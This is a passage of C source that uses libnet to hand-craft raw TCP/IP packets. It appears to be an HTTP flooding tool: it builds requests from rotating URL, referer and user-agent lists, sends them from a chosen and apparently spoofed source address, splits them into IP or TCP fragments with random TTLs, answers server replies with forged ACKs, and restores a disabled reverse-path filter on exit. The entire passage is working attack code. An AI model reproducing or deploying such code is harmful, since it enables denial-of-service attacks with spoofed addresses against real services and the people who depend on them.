                        ip_id,
                        hdr_offset, /* IP Frag */
                        (rand() % 253) + 3, /* TTL */
                        proto,
                        0, /* checksum */ 
                        sIp, dstIp,
                        (unsigned char *)p, /* payload */
                        packet_pload_size, /* payload size */
                        libnetHandle, ipTag) == -1) {
                    fprintf(stderr, "Can't build ipv4 header: %s\n", libnet_geterror(libnetHandle));
                }
                if (libnet_write(libnetHandle) == -1) {
                    fprintf(stderr, "Can't send tcp ack/fin packet: %s\n", libnet_geterror(libnetHandle));
                }
                pload_offset = packet_pload_size;
                libnet_clear_packet(libnetHandle);
            
                max_pload_size = (MTU - LIBNET_IPV4_H);
                max_pload_size -= (max_pload_size % 8);
        
                while (total_pload_size > pload_offset) {
                    if (max_pload_size > (total_pload_size - pload_offset)) {
                        hdr_offset = pload_offset/8;
                        packet_pload_size = total_pload_size - pload_offset;
                    } else {
                        hdr_offset = IP_MF + pload_offset/8;
                        packet_pload_size = max_pload_size;
                    }
                    if (libnet_build_ipv4(
                            LIBNET_IPV4_H + packet_pload_size,
                            0, /* TOS */
                            ip_id,
                            hdr_offset, /* IP Frag */
                            (rand() % 253) + 3, /* TTL */
                            proto,
                            0, /* checksum */ 
                            sIp, dstIp,
                            (unsigned char*)(p + pload_offset), /* payload */
                            packet_pload_size, /* payload size */
                            libnetHandle, ipTag) == -1) {
                        fprintf(stderr, "Can't build ipv4 header: %s\n", libnet_geterror(libnetHandle));
                    }
                    if (libnet_write(libnetHandle) == -1) {
                        fprintf(stderr, "Can't send tcp ack/fin packet: %s\n", libnet_geterror(libnetHandle));
                    }
                    pload_offset += packet_pload_size;
                    libnet_clear_packet(libnetHandle);
                }
                free(pkt_buf);
            } else if (fragMode == 1) {
                // -- using TCP fragments --
                libnet_clear_packet(libnetHandle);

                // we send only first packet here, all the others will be sent in Ack handler
                if(libnet_build_tcp(origSrcPort, dstPort, remoteAck, remoteSeq+1, 
                        TH_ACK, WINDOW_SIZE, 0, 0, LIBNET_IPV4_H + LIBNET_TCP_H - 20 + max_pload_size,
                        (unsigned char*)request, max_pload_size, libnetHandle, 0)==-1) {
                        fprintf(stderr, "Can't build tcp header: %s\n", libnet_geterror(libnetHandle));
                }
                buildIp(max_pload_size, libnetHandle, 0, sIp);
                if (libnet_write(libnetHandle) == -1) {
                    fprintf(stderr, "Can't send tcp ack/fin packet: %s\n", libnet_geterror(libnetHandle));
                }
                libnet_clear_packet(libnetHandle);

                connections[key].pload_offset = max_pload_size;
                connections[key].url = url_number;            }
        }
    // -- acknowledge every but reset packets and the final ack packet --
    } else if(! tcp->rst && connections[key].status == CONNECTING) {
        sendAck(libnetHandle, ip, tcp, key);
    } else if(! tcp->rst && connections[key].status == ESTABLISHED) {
        if (fragMode == 1) {
            if (tcp->ack) {

                max_pload_size = (MTU - LIBNET_IPV4_H - LIBNET_TCP_H);
                max_pload_size -= (max_pload_size % 8);

                uint32_t remoteAck = htonl(tcp->ack_seq);
                uint32_t remoteSeq = htonl(tcp->seq);

                int url_number = connections[key].url;
                int ref_number = connections[key].referer;
                int useragent_number = connections[key].useragent;
                buildRequest(request, url_number, ref_number, useragent_number, urls, useragents);
                p = (unsigned char *)request;
                total_pload_size = strlen(request);
                pload_offset = connections[key].pload_offset;

                if ((total_pload_size - pload_offset) == 0) {
                    sendAck(libnetHandle, ip, tcp, key);
                    connections[key].status = CLOSED;
                    if(urls.size > 1){
                        connections[key].referer = url_number;
                    }
                } else {
                    if (max_pload_size > (total_pload_size - pload_offset)) {
                        packet_pload_size = total_pload_size - pload_offset;
                    } else {
                        packet_pload_size = max_pload_size;
                    }

                    libnet_clear_packet(libnetHandle);
                    if(libnet_build_tcp(origSrcPort, dstPort, remoteAck, remoteSeq, 
                            TH_ACK, WINDOW_SIZE, 0, 0, LIBNET_IPV4_H + LIBNET_TCP_H - 20 + packet_pload_size,
                            (unsigned char*)(p + pload_offset), packet_pload_size, libnetHandle, 0)==-1) {
                        fprintf(stderr, "Can't build tcp header _ : %s\n", libnet_geterror(libnetHandle));
                    }
                    buildIp(packet_pload_size, libnetHandle, 0, sIp);
                    if (libnet_write(libnetHandle) == -1) {
                        fprintf(stderr, "Can't send tcp ack/fin packet: %s\n", libnet_geterror(libnetHandle));
                    }
                    libnet_clear_packet(libnetHandle);

                    connections[key].pload_offset = pload_offset + packet_pload_size;
                }
            }
        } else {
            sendAck(libnetHandle, ip, tcp, key);
        }
    // -- connection probably closed -> 'clear' port --
    } else if (tcp->ack) {
        connections[key].status = NOT_CONNECTED; // no connection
        finishedCount++;
    }
}

void sendAck(libnet_t *libnetHandle, const struct iphdr* ip, const struct tcphdr* tcp, u_int32_t key) {
    
    libnet_clear_packet(libnetHandle);
    
    size_t ackSize = ntohs(ip->tot_len) - ((short)ip->ihl * 4) - ((short)tcp->doff * 4); // size of payload
    
    if(tcp->fin || tcp->syn)
        ackSize += 1;
    
    if(ackSize>0) {
        u_int32_t lastSeq = ntohl(tcp->ack_seq);
        u_int32_t lastAck = ntohl(tcp->seq) + ackSize;
        u_int8_t flags = TH_ACK;
            
        if(tcp->fin) {
            flags |= TH_FIN;
            connections[key].status = CLOSED; //fin
        }
            
        if(libnet_build_tcp(ntohs(tcp->dest), dstPort, lastSeq, lastAck, 
            flags, WINDOW_SIZE, 0, 0, LIBNET_IPV4_H + LIBNET_TCP_H - 20,
            0, 0, libnetHandle, 0) == -1 ) {
            fprintf(stderr, "Can't build tcp header: %s\n", libnet_geterror(libnetHandle));
        }
        buildIp(0, libnetHandle, 0, ip->daddr);
        if (libnet_write(libnetHandle) == -1) {
            fprintf(stderr, "Can't send tcp ack packet: %s\n", libnet_geterror(libnetHandle));
        }
    }
}

void INThandler(int sig) {
    char    buf[1024];
    FILE    *f = NULL;
    extern int errno;    

    signal(sig, SIG_IGN);
    if (rp_filter == 1) {
        f = fopen("/proc/sys/net/ipv4/conf/all/rp_filter", "w");
        if(!f) {
            fprintf(stderr, "Can't open proc file system: %s. Make sure to disable rp_filter manually.\n", strerror( errno ));
        }
        else {
            fprintf(f,"1");
            fclose(f);
       }
    }
   exit(EXIT_SUCCESS);
}
